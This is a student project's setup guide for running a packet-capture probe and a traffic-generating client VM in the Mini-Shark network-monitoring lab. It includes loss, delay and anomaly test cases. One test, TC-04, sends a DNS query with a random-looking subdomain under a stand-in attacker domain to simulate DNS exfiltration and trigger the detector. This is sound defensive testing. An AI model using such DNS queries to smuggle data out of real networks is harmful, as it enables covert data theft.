# Mini-Shark — Laptop 2 Setup Guide (Probe 2)

**Project:** Mini-Shark (23ECNP301) · Team 07  
**Guide:** Prof. Pooja Shettar · KLE Technological University  
**Purpose:** This document tells you exactly how to set up Laptop 2 so it connects  
to the Mini-Shark central server on Laptop 1 and enables end-to-end two-probe testing.

---

## What You Are Setting Up

```
YOUR LAPTOP (Laptop 2 — Arch Linux Host)
├── VM3 (Ubuntu) — CLIENT
│     Generates real network traffic (ping, HTTP, DNS)
│
└── VM4 (Ubuntu) — PROBE 2
      Captures packets on the network
      Computes fingerprints (BLAKE2b)
      Sends 24-byte telemetry to Central Server
```

**Central Server (Laptop 1) is already running at:**
- API:  `http://192.168.130.129:8001`
- E3 Telemetry Port: `192.168.130.129:9000`

---

## Requirements

- Arch Linux as host OS
- 2 Ubuntu VMs already created (VMware or VirtualBox)
- Both VMs set to **Bridged Network** (not NAT)
- Both Laptops connected to the **same Wi-Fi router or switch**
- Internet access on VMs (for installing packages)

---

## PART 1 — Network Setup

### Step 1.1 — Set VMs to Bridged Networking

#### In VMware:
1. Open VMware → right-click each VM → Settings
2. Network Adapter → Change from NAT to **Bridged**
3. Select your physical Wi-Fi or Ethernet adapter

#### In VirtualBox:
1. Open VirtualBox → click each VM → Settings
2. Network → Adapter 1 → Attached to: **Bridged Adapter**
3. Name: select your physical Wi-Fi or Ethernet adapter

> **Why Bridged?** This gives each VM a real IP address on your router's network
> so they can talk directly to Laptop 1 (192.168.130.129).

---

### Step 1.2 — Boot both VMs and find their IPs

Start both VMs. Inside each VM, open a terminal and run:

```bash
ip addr show
```

Look for a line like:
```
inet 192.168.x.x/24
```

Note down:
- **VM3 IP** (Client)
- **VM4 IP** (Probe 2)

---

### Step 1.3 — Verify connectivity to Laptop 1

**Inside VM4, run:**
```bash
ping -c 4 192.168.130.129
```

Expected output:
```
64 bytes from 192.168.130.129: icmp_seq=1 ttl=64 time=2.3 ms
64 bytes from 192.168.130.129: icmp_seq=2 ttl=64 time=1.8 ms
```

**If ping fails:**
- Check that both laptops are on the same Wi-Fi network
- Check VM is set to Bridged (not NAT)
- Try: `ping 192.168.130.1` (the router) — if this works, the VM has internet but can't reach Laptop 1

> **Tell Chhavi your VM4 IP** so she can verify on her end.

---

## PART 2 — VM4 Setup (Probe 2)

All commands in this section are run inside **VM4 terminal**.

### Step 2.1 — Install system packages

```bash
sudo apt update
sudo apt install python3.10-venv python3-pip git curl net-tools -y
```

---

### Step 2.2 — Clone the repository

```bash
git clone https://github.com/HrishiiLit/Mini_Shark.git
cd Mini_Shark
git checkout integration
```

Verify you are on the right branch:
```bash
git branch
```
Should show: `* integration`

---

### Step 2.3 — Create Python virtual environment

```bash
cd ~/Mini_Shark
python3 -m venv .venv
source .venv/bin/activate
```

You will see `(.venv)` at the start of your prompt.

---

### Step 2.4 — Install Python dependencies

```bash
pip install -r requirements.txt
pip install scapy
```

This downloads about 50 MB. Wait for it to finish.

Expected end of output:
```
Successfully installed fastapi uvicorn sqlalchemy dpkt scapy ...
```

---

### Step 2.5 — Set packet capture permissions

This allows Python to capture packets without needing sudo every time:

```bash
sudo setcap cap_net_raw,cap_net_admin=eip $(readlink -f .venv/bin/python3)
```

No output = success.

---

### Step 2.6 — Find your network interface name

```bash
ip link show
```

Look for the interface that is **UP** (active). It will be one of:
- `ens33`
- `eth0`
- `enp0s3`
- `enp0s8`

Example output:
```
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.1.61/24
```

**Note your interface name** — you need it in the next step.

---

### Step 2.7 — Start Probe 2

Replace `ens33` with your actual interface name from Step 2.6:

```bash
cd ~/Mini_Shark
source .venv/bin/activate
python3 run_probe.py --probe-id 2 --server 192.168.130.129:9000 --iface ens33
```

**Expected output:**
```
══════════════════════════════════════════════════════════
  Mini-Shark  ·  Probe 2
══════════════════════════════════════════════════════════
  Interface   : ens33
  E3 Server   : 192.168.130.129:9000
  BPF filter  : (none — capture everything)
  Algorithm   : BLAKE2b-64  |  Timeout: 500ms
──────────────────────────────────────────────────────────
  [Probe 2] Connected to E3 server at 192.168.130.129:9000
  [Probe 2] Starting continuous live capture...
  [Probe 2] Press Ctrl+C to stop

  #        Layers                      Fingerprint          Info
  -------- --------------------------- -------------------- ----------
  1        Ethernet > IPv4 > ICMP      0x8F3A2B194E5C0D1A   Type=8
```

**Keep this terminal open. Do not close it.**

---

## PART 3 — VM3 Setup (Client — Traffic Generator)

All commands in this section are run inside **VM3 terminal**.

### Step 3.1 — Install tools

```bash
sudo apt update
sudo apt install curl iputils-ping dnsutils -y
```

---

### Step 3.2 — Verify connectivity

```bash
ping -c 4 192.168.130.129
curl http://192.168.130.129:8001/health
```

Expected from curl:
```json
{"status":"ok","version":"0.4.0","e3_server":"0.0.0.0:9000",...}
```

---

## PART 4 — Run the 4 Test Cases

Now generate traffic from VM3 while Probe 2 is running on VM4.

### TC-01 — Baseline Normal Traffic

```bash
# On VM3 — generate continuous traffic
ping 192.168.130.129 -i 0.5
```

**What you should see on Chhavi's dashboard:**
- Rows appearing in the packet list (ICMP — pink colour)
- Matched packets count increasing
- Loss Rate = 0%
- ΔT = 1–5 ms (real one-way delay)

---

### TC-02 — Packet Loss Test (15% drop)

```bash
# On VM3 — inject 15% packet loss
sudo tc qdisc add dev ens33 root netem loss 15%

# Generate traffic
ping -c 30 192.168.130.129

# Remove the rule after test
sudo tc qdisc del dev ens33 root
```

**What you should see on dashboard:**
- Red rows — UNMATCHED / SILENT DROP
- Loss Rate jumps to ~15%
- PACKET_LOSS alert fires

---

### TC-03 — Bufferbloat Test (75ms delay)

```bash
# On VM3 — add 75ms delay with 15ms jitter
sudo tc qdisc add dev ens33 root netem delay 75ms 15ms

# Generate traffic
ping -c 20 192.168.130.129
curl http://192.168.130.129:8001/health

# Remove the rule after test
sudo tc qdisc del dev ens33 root
```

**What you should see on dashboard:**
- Live latency chart spikes to ~75ms
- BUFFERBLOAT alert fires

---

### TC-04 — DNS Exfiltration Test

```bash
# On VM3 — send high-entropy DNS query
nslookup xk2m9pqvzjrfhbtw.exfil.attacker.io 192.168.130.129
```

Or install and run the test script:
```bash
cd ~/Mini_Shark
source .venv/bin/activate
python3 test_anomalies.py
```

**What you should see on dashboard:**
- DNS row with ⚠ icon
- DNS_EXFIL_SUSPECTED alert fires
- H = 4.4 bits shown (above 4.2 threshold)

---

## PART 5 — Troubleshooting

### Problem: Probe 2 shows "Connection refused"

```
[Probe 2] Attempt 1/10 failed: Connection refused
```

**Fix:** The central server on Laptop 1 is not running. Tell Chhavi to start it:
```bash
cd ~/Mini_Shark && source .venv/bin/activate
python3 -m uvicorn backend.main:app --host 0.0.0.0 --port 8001
```

---

### Problem: "No such device" or interface error

```
[Probe 2] Capture error: [Errno 19] No such device
```

**Fix:** Wrong interface name. Run `ip link show` and use the correct name:
```bash
python3 run_probe.py --probe-id 2 --server 192.168.130.129:9000 --iface eth0
```

---

### Problem: Ping to 192.168.130.129 fails

**Check 1:** Are both laptops on the same Wi-Fi?
```bash
ip route show default
```
Should show your router's IP (e.g. 192.168.1.1 or 192.168.130.1).

**Check 2:** Is VM in Bridged mode?  
Open VMware/VirtualBox settings → Network → must say **Bridged**, not NAT.

**Check 3:** Try pinging the router first:
```bash
ping 192.168.130.1
```
If this fails → your VM is not on the right network.

---

### Problem: "Permission denied" when capturing

```
[Probe 2] Capture error: Operation not permitted
```

**Fix:** Run setcap again:
```bash
sudo setcap cap_net_raw,cap_net_admin=eip $(readlink -f .venv/bin/python3)
```

---

### Problem: venv fails to create

```
The virtual environment was not created successfully because ensurepip is not available
```

**Fix:**
```bash
sudo apt install python3.10-venv -y
python3 -m venv .venv
```

---

## Quick Reference Card

```
═══════════════════════════════════════════════════
  MINI-SHARK — LAPTOP 2 QUICK REFERENCE
═══════════════════════════════════════════════════

  Central Server (Laptop 1): 192.168.130.129
  E3 Telemetry Port         : 9000
  API Port                  : 8001
  Dashboard                 : http://192.168.130.129:5173

  VM4 (Probe 2) — START:
    cd ~/Mini_Shark
    source .venv/bin/activate
    python3 run_probe.py \
      --probe-id 2 \
      --server 192.168.130.129:9000 \
      --iface <your-interface>

  VM3 (Client) — GENERATE TRAFFIC:
    ping 192.168.130.129 -i 0.5
    curl http://192.168.130.129:8001/health

  VERIFY PROBE IS CONNECTED:
    You should see "Connected to E3 server" in VM4 terminal
    On Chhavi's dashboard: matched packets should increase

  FIND YOUR INTERFACE:
    ip link show
    (look for state UP with your subnet IP)
═══════════════════════════════════════════════════
```

---

## What to Tell Chhavi Once Running

Send her:
1. Your VM4 IP address (from `ip addr show` on VM4)
2. Confirmation that Probe 2 shows "Connected"
3. Screenshots of the terminal showing packets being captured

She will verify on her dashboard that:
- Matched count increases (both probes see same packet)
- ΔT shows real one-way delay
- Alerts fire during TC-02, TC-03, TC-04

---

*Prepared by Chhavi Mishra (E2) · Mini-Shark Team 07*  
*KLE Technological University · Hubballi, Karnataka*  
*Repository: https://github.com/HrishiiLit/Mini_Shark (branch: integration)*
